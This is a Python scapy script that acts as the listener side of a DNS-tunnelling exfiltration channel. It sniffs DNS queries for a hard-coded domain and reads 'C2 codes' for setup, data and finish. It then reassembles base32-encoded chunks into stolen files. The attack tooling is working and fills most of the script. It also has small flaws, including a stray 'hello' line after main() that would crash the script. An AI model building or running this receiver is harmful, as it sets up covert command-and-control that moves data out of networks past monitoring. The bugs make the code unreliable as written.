#! /usr/bin/env python3

from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP
import random
import string
import sys, argparse
import time
import base64
apexdomain = 'docybertoit.com.'
file_uuids = []
file_chunks = {}
num_chunks = 0

def get_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def get_random_ip_address():
    #def randquad(): return str(random.randint(1,223))
    randIP = [str(random.randint(1,223)) for i in range(0,4)]
    return '.'.join(x for x in randIP)

def dns_responder(pkt: IP):
    
    
    queryname = pkt["DNS Question Record"].qname #byte class
    query = queryname.decode('utf-8').strip()
    
    # print(query[-16:])
    if apexdomain in query[-16:]:
        """
        #this query is destined for this listener, need to extra the UUID to
        determine if the file is already in transit or a new file, then start receiving the data
        
        dns query format:
        C2 codes
        A = setup query
        D = data query
        Z = file upload finished
        1. send setup_query, coded with A and number of file chunks
        2. send file_chunk_query, coded with D, each file chunk identified by its index
        3. send finish_query query with Z, denoting complete

        setup_query = UUID.CODE.NUMCHUNKS.TOPLEVELDOMAIN.com
        data_query = UUID.CODE.index.file_data.TOPLEVELDOMAIN.com
        finish_query = UUID.code.final_index.topleveldomain.com
        """
        info = (query.split('.'))
        #info[0] = uuid
        #info[1] = c2code
        #info[2] = index
        uuid = info[0]

        if uuid not in file_chunks.keys():
            file_chunks[uuid] = []

        c2code = info[1]

        index = int(info[2])

        if c2code == 'A':
            global num_chunks
            num_chunks = index
            print("Num chunks = ", num_chunks)
            print("start of file, num_chunks = ", num_chunks)
            file_chunks[uuid] =  [None] * num_chunks    #create the list with the total index length
            print("The length of the file_chunks list is: ", len(file_chunks[uuid]))

        if c2code == 'D':
            #print("UUID: ", uuid)
            #print("INDEX: " , index)
            #print("INFO: " , info[3])
            file_chunks[uuid][index] = info[3]
            #print(file_chunks[uuid][index])
        
        if c2code == 'Z':
            print('end of file')
            #print(file_chunks[uuid])
            save_base32_file(uuid, file_chunks[uuid])


        
    return

def save_base32_file(file_name, file_data):
    #saves a file with name file_name, going over a list of data chunks that are base32 encoded, 
    # converts them back to byte data, and saves the file
    f = open(f"receive/{file_name}", 'wb')
    for data in file_data:
        #first, convert from b32 back to data string
        #then, conver str to byte data
        #then, write to file
        b32_decode_str = base64.b32decode(data)
        #print(b32_decode_str)
        #b#yte_data = str.encode(b32_decode_str)
        #p#rint(byte_data)
        f.write(b32_decode_str)
        print("Wrote file to {file_name}")

    f.close()

                    

def start_sniffer(bpf_filter, listen_int):
    print('Sniffing on ', listen_int, ' with a filter of: ', bpf_filter)

    #sniff(filter=bpf_filter, prn=dns_responder, listen_int='ens38')
    sniff(filter=bpf_filter, prn=dns_responder, iface = listen_int)
    #sniff(filter=bpf_filter, prn=dns_responder, listen_int=listen_int)
    

def main(args):

    print(args)
    if(args['listener']):
        print("Starting DNS listener/responder")
        global listen_int, local_ip, apexdomain
        
        
        listen_int = args['interface']
        

        
        #bpf_filter =  f"udp port 53 and ip dst {args['dns']}"
        bpf_filter =  "udp port 53"
        print(listen_int)
        start_sniffer(bpf_filter, listen_int)



if __name__ == "__main__":

    ap = argparse.ArgumentParser()
    ap.add_argument('--listener', dest='listener', help='Define if this is going to listen for DNS queries \
        or send queries to a DNS server', action='store_true')
    ap.add_argument("-i", "--interface", type=str, default='',
        help='If this is a responding dns tumbler, define the interface \
        to listen on. Otherwise omit')

    args = vars(ap.parse_args())
    
    main(args)
    hello